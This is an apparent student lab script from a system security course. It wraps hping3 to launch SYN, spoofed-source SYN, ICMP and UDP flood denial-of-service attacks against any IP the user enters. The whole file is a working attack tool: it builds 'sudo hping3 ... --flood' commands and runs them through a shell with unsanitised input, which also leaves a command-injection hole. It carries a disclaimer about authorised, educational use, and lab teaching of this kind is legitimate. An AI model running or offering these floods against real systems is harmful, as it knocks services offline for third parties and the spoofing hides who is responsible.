# Experiment 9: DoS Attack Simulation
# Course: System Security Lab (CSL604)
# Name: Amey Thakur (https://github.com/Amey-Thakur)
# Roll No: 50
# Batch: B3
# Repository: https://github.com/Amey-Thakur/CRYPTOGRAPHY-AND-SYSTEM-SECURITY-AND-SYSTEM-SECURITY-LAB
# Date: April 20, 2021

"""
Experiment 9: Simulate DOS attack using Hping, hping3 and other tools.

Description:
This script behaves as a wrapper for 'hping3', a command-line oriented TCP/IP packet assembler/analyzer.
It demonstrates how to construct commands for simulating DoS attacks (e.g., SYN Flood).
Note: This script requires 'hping3' which is typically found in Linux distributions (like Kali Linux).
Running DoS attacks on networks you do not own or have permission to test is illegal.

Requirements:
- Python 3.x
- hping3 (Linux/WSL)

Usage:
> python DoS_Attack_Simulator.py
"""

import subprocess
import sys

def run_hping3(command):
    """
    Executes the hping3 command.
    """
    print(f"\n[+] Executing: {command}")
    print("-" * 60)
    try:
        # Warning: hping3 usually requires root privileges (sudo)
        subprocess.run(command, shell=True)
        print("-" * 60)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[!] Error: {e}")

def main():
    print("--- DoS Attack Simulation (hping3 wrapper) ---")
    print("DISCLAIMER: Use this tool ONLY for educational purposes on authorised networks.")
    
    target_ip = input("Enter Target IP: ").strip()
    if not target_ip:
        print("[!] Target IP is required.")
        return

    print("\nSelect Attack Mode:")
    print("1. SYN Flood (hping3 -S <target> -p 80 --flood)")
    print("2. Spoofed SYN Flood (hping3 -S <target> -a <spoofed_ip> -p 80 --flood)")
    print("3. ICMP Flood (hping3 -1 <target> --flood)")
    print("4. UDP Flood (hping3 -2 <target> --flood)")
    
    choice = input("Choice (1-4): ").strip()

    if choice == '1':
        port = input("Enter Target Port (default 80): ").strip() or "80"
        cmd = f"sudo hping3 -S {target_ip} -p {port} --flood"
        run_hping3(cmd)
    
    elif choice == '2':
        spoof_ip = input("Enter Spoofed Source IP: ").strip()
        port = input("Enter Target Port (default 80): ").strip() or "80"
        if not spoof_ip:
            print("[!] Spoofed IP required.")
            return
        cmd = f"sudo hping3 -S {target_ip} -a {spoof_ip} -p {port} --flood"
        run_hping3(cmd)

    elif choice == '3':
        cmd = f"sudo hping3 -1 {target_ip} --flood"
        run_hping3(cmd)
        
    elif choice == '4':
        cmd = f"sudo hping3 -2 {target_ip} --flood"
        run_hping3(cmd)

    else:
        print("[!] Invalid choice.")

if __name__ == "__main__":
    main()
